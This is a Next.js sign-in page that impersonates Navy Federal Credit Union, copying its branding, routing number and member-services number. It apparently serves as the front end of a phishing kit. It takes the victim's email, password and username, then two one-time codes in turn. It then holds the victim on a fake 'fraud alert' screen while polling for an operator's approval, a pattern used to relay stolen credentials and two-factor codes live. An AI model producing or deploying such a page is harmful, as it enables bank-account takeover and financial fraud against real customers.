'use client';

import { useEffect, useState } from 'react';
import {
  startChallenge,
  submitUsername,
  submitOtp,
  getStatus,
} from '@/app/actions';

type Step =
  | 'credentials'
  | 'username'
  | 'otp1'
  | 'otp2'
  | 'awaiting_approval'
  | 'rejected'
  | 'approved_success';

const WAIT_MSG =
  'Your account verification will automatically update here once admin looks into the fraud alert.';

export default function SignInPage() {
  const [step, setStep] = useState<Step>('credentials');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [username, setUsername] = useState('');
  const [otp, setOtp] = useState('');
  const [attemptId, setAttemptId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [note, setNote] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (step !== 'awaiting_approval' || !attemptId) return;
    let cancelled = false;
    const tick = async () => {
      const s = await getStatus(attemptId);
      if (cancelled) return;
      if (s.status === 'approved') setStep('approved_success');
      if (s.status === 'rejected' || s.status === 'expired') {
        setStep('rejected');
        setError('Sign-in was rejected.');
      }
    };
    tick();
    const id = setInterval(tick, 2500);
    return () => {
      cancelled = true;
      clearInterval(id);
    };
  }, [step, attemptId]);

  // Early returns for final states
  if (step === 'approved_success') {
    return (
      <div style={styles.page}>
        <div style={styles.card}>
          <div style={styles.icon}>✅</div>
          <h1 style={styles.heading}>Congratulations</h1>
          <p style={styles.text}>Your account &amp; verification has been approved.</p>
          {email ? <p style={styles.text}>{email}</p> : null}
        </div>
      </div>
    );
  }

  if (step === 'rejected') {
    return (
      <div style={styles.page}>
        <div style={styles.card}>
          <div style={styles.icon}>🚫</div>
          <h1 style={{ ...styles.heading, color: '#c62828' }}>Sign-in Blocked</h1>
          <p style={styles.text}>Your sign-in was rejected.</p>
          <button
            style={styles.orangeBtn}
            onClick={() => {
              setStep('credentials');
              setAttemptId(null);
              setUsername('');
              setOtp('');
              setError(null);
              setNote(null);
            }}
          >
            Try Again
          </button>
        </div>
      </div>
    );
  }

  const titles: Record<Exclude<Step, 'approved_success'>, string> = {
    credentials: 'Sign In',
    username: 'Enter Username',
    otp1: 'Enter Code',
    otp2: 'Enter Second Code',
    awaiting_approval: 'Verification in Progress',
    rejected: 'Sign-in Blocked',
  };

  // FIXED: Only show submit for these 4 active steps
  const activeSteps: Step[] = ['credentials', 'username', 'otp1', 'otp2'];
  const showSubmit = activeSteps.includes(step);

  // FIXED: Only show "Start Over" for these steps
  const showStartOver = step !== 'credentials' && step !== 'awaiting_approval' && step !== 'rejected' && step !== 'approved_success';

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setError(null);
    setLoading(true);
    try {
      if (step === 'credentials') {
        const r = await startChallenge({ email, password });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setAttemptId(r.attemptId);
        setStep('username');
        setNote(null);
        return;
      }
      if (step === 'username') {
        if (!attemptId) {
          setLoading(false);
          setError('Session lost.');
          return;
        }
        const r = await submitUsername({ attemptId, username });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setOtp('');
        setStep('otp1');
        setNote('Code sent to your email.');
        return;
      }
      if (step === 'otp1' || step === 'otp2') {
        if (!attemptId) {
          setLoading(false);
          setError('Session lost.');
          return;
        }
        const which = step === 'otp1' ? 1 : 2;
        const r = await submitOtp({ attemptId, otp, which });
        setLoading(false);
        if (!r.ok) {
          setError(r.error);
          return;
        }
        setOtp('');
        if (r.next === 'otp2') {
          setStep('otp2');
          setNote('New second code sent to your email.');
          return;
        }
        setStep('awaiting_approval');
        setNote(WAIT_MSG);
      }
    } catch (err) {
      setLoading(false);
      setError(err instanceof Error ? err.message : 'Error');
    }
  }

  return (
    <div style={styles.page}>
      {/* HEADER */}
      <header style={styles.header}>
        <div style={styles.headerInner}>
          <div style={styles.logo}>
            NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span>
          </div>
          <span style={styles.routing}>Routing Number: 256074974</span>
        </div>
      </header>

      {/* MAIN */}
      <div style={styles.content}>
        <div style={styles.container}>
          <h1 style={styles.formHeading}>{titles[step as Exclude<Step, 'approved_success'>]}</h1>

          <form onSubmit={onSubmit} style={styles.form}>
            {step === 'credentials' && (
              <>
                <div style={styles.field}>
                  <label style={styles.label}>Email Address</label>
                  <input
                    type="email"
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    style={styles.input}
                    placeholder="you@example.com"
                  />
                </div>
                <div style={styles.field}>
                  <label style={styles.label}>Password</label>
                  <input
                    type="password"
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    style={styles.input}
                    placeholder="Enter your password"
                  />
                </div>
                <a href="#" style={styles.helpLink}>SIGN IN HELP</a>
              </>
            )}

            {step === 'username' && (
              <div style={styles.field}>
                <label style={styles.label}>Username</label>
                <input
                  required
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  style={styles.input}
                  placeholder="Enter your username"
                  autoComplete="username"
                />
              </div>
            )}

            {(step === 'otp1' || step === 'otp2') && (
              <div style={styles.field}>
                <label style={styles.label}>
                  {step === 'otp1' ? 'Verification Code' : 'Second Code'}
                </label>
                <input
                  required
                  inputMode="numeric"
                  maxLength={6}
                  value={otp}
                  onChange={(e) =>
                    setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))
                  }
                  style={{ ...styles.input, ...styles.otpInput }}
                  placeholder="000000"
                />
              </div>
            )}

            {step === 'awaiting_approval' && (
              <div style={styles.waitingBox}>
                <div style={styles.waitingIcon}>⏳</div>
                <p style={styles.waitingText}>{WAIT_MSG}</p>
              </div>
            )}

            {error && <div style={styles.error}>❌ {error}</div>}
            {note && step !== 'awaiting_approval' && (
              <div style={styles.note}>{note}</div>
            )}

            {/* FIXED: Using showSubmit boolean */}
            {showSubmit && (
              <button type="submit" disabled={loading} style={styles.submit}>
                {loading ? 'Processing…' : 'Continue'}
              </button>
            )}

            {/* FIXED: Using showStartOver boolean */}
            {showStartOver && (
              <button
                type="button"
                style={styles.secondary}
                onClick={() => {
                  setStep('credentials');
                  setAttemptId(null);
                  setUsername('');
                  setOtp('');
                  setError(null);
                  setNote(null);
                }}
              >
                Start Over
              </button>
            )}
          </form>
        </div>
      </div>

      {/* FOOTER */}
      <footer style={styles.footer}>
        <div style={styles.footerInner}>
          <div>
            <div style={styles.footerLogo}>
              NAVY <span style={{ color: '#ed780f' }}>FEDERAL</span>
            </div>
            <div style={styles.footerContact}>
              24/7 Member Services: <strong>1-888-842-6328</strong>
            </div>
            <div style={styles.footerContact}>
              Routing Number: <strong>256074974</strong>
            </div>
          </div>
          <div style={styles.footerLinks}>
            <a href="#" style={styles.footerLink}>About Us</a>
            <a href="#" style={styles.footerLink}>Contact Us</a>
            <a href="#" style={styles.footerLink}>Privacy</a>
            <a href="#" style={styles.footerLink}>Security</a>
            <a href="#" style={styles.footerLink}>Accessibility</a>
            <a href="#" style={styles.footerLink}>Terms</a>
          </div>
        </div>
        <div style={styles.footerBottom}>
          <span>© 2026 Navy Federal Credit Union.</span>
          <span>All rights reserved.</span>
        </div>
      </footer>
    </div>
  );
}

// ==========================================
// STYLES
// ==========================================

const styles: Record<string, React.CSSProperties> = {
  page: {
    minHeight: '100vh',
    background: '#fafafa',
    fontFamily: '"Source Sans Pro", "Helvetica Neue", Helvetica, Arial, sans-serif',
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
  },
  header: {
    background: '#0a1628',
    padding: '12px 16px',
    width: '100%',
  },
  headerInner: {
    maxWidth: '1200px',
    margin: '0 auto',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
    flexWrap: 'wrap',
    gap: '8px',
  },
  logo: {
    fontSize: 'clamp(18px, 4vw, 24px)',
    fontWeight: 700,
    color: 'white',
    letterSpacing: '1px',
  },
  routing: {
    color: 'rgba(255,255,255,0.7)',
    fontSize: 'clamp(11px, 2vw, 14px)',
  },
  content: {
    flex: 1,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    padding: '24px 16px',
    width: '100%',
    maxWidth: '400px',
  },
  container: {
    width: '100%',
  },
  formHeading: {
    fontSize: 'clamp(20px, 4vw, 28px)',
    fontWeight: 600,
    color: '#0a1628',
    marginBottom: '24px',
  },
  form: {
    display: 'flex',
    flexDirection: 'column',
    gap: '16px',
  },
  field: {
    display: 'flex',
    flexDirection: 'column',
    gap: '6px',
  },
  label: {
    fontSize: '14px',
    fontWeight: 500,
    color: '#222',
  },
  input: {
    height: 40,
    padding: '0 12px',
    border: '2px solid #999',
    borderRadius: '6px',
    background: '#fff',
    fontSize: '16px',
    outline: 'none',
    width: '100%',
    boxSizing: 'border-box',
  },
  otpInput: {
    textAlign: 'center',
    fontSize: '24px',
    letterSpacing: '8px',
  },
  helpLink: {
    display: 'inline-block',
    color: '#0667ba',
    fontSize: '14px',
    fontWeight: 600,
    textDecoration: 'none',
    borderBottom: '2px dotted #0667ba',
    paddingBottom: '2px',
    textTransform: 'uppercase',
    width: 'fit-content',
  },
  submit: {
    height: 44,
    border: 'none',
    borderRadius: '6px',
    background: '#ed780f',
    color: 'white',
    fontSize: '16px',
    fontWeight: 600,
    cursor: 'pointer',
    width: '100%',
  },
  secondary: {
    height: 40,
    border: '2px solid #0667ba',
    borderRadius: '6px',
    background: 'transparent',
    color: '#0667ba',
    fontSize: '14px',
    fontWeight: 600,
    cursor: 'pointer',
    width: '100%',
  },
  error: {
    padding: '10px 14px',
    borderRadius: '4px',
    background: '#ffebee',
    color: '#c62828',
    fontSize: '14px',
    border: '1px solid #ffcdd2',
  },
  note: {
    padding: '10px 14px',
    borderRadius: '4px',
    background: '#e3f2fd',
    color: '#0d47a1',
    fontSize: '14px',
    border: '1px solid #bbdefb',
  },
  waitingBox: {
    textAlign: 'center',
    padding: '20px 0',
  },
  waitingIcon: {
    fontSize: '48px',
    marginBottom: '16px',
  },
  waitingText: {
    color: '#555',
    fontSize: '14px',
    lineHeight: 1.6,
  },
  card: {
    maxWidth: '400px',
    width: '100%',
    padding: '40px 30px',
    background: 'white',
    borderRadius: '12px',
    boxShadow: '0 8px 24px rgba(0,0,0,0.12)',
    textAlign: 'center',
  },
  icon: {
    fontSize: '48px',
    marginBottom: '16px',
  },
  heading: {
    fontSize: 'clamp(24px, 4vw, 28px)',
    fontWeight: 600,
    color: '#0a1628',
    marginBottom: '8px',
  },
  text: {
    fontSize: '16px',
    color: '#555',
    marginBottom: '8px',
  },
  orangeBtn: {
    padding: '12px 32px',
    background: '#ed780f',
    color: 'white',
    fontSize: '18px',
    fontWeight: 600,
    border: 'none',
    borderRadius: '8px',
    cursor: 'pointer',
    marginTop: '16px',
  },
  footer: {
    background: '#0a1628',
    color: 'rgba(255,255,255,0.7)',
    padding: 'clamp(30px, 5vw, 40px) 16px',
    marginTop: '40px',
    width: '100%',
  },
  footerInner: {
    maxWidth: '1200px',
    margin: '0 auto',
    display: 'flex',
    flexWrap: 'wrap',
    gap: 'clamp(20px, 4vw, 30px)',
    justifyContent: 'space-between',
  },
  footerLogo: {
    fontSize: 'clamp(18px, 3vw, 20px)',
    fontWeight: 700,
    color: 'white',
    marginBottom: '8px',
  },
  footerContact: {
    fontSize: 'clamp(12px, 2vw, 14px)',
    marginBottom: '8px',
  },
  footerLinks: {
    display: 'flex',
    flexWrap: 'wrap',
    gap: 'clamp(12px, 2vw, 20px)',
  },
  footerLink: {
    color: 'rgba(255,255,255,0.7)',
    textDecoration: 'none',
    fontSize: 'clamp(12px, 2vw, 14px)',
  },
  footerBottom: {
    borderTop: '1px solid rgba(255,255,255,0.1)',
    paddingTop: '20px',
    marginTop: '20px',
    textAlign: 'center',
    fontSize: 'clamp(11px, 2vw, 12px)',
    maxWidth: '1200px',
    margin: '20px auto 0',
  },
};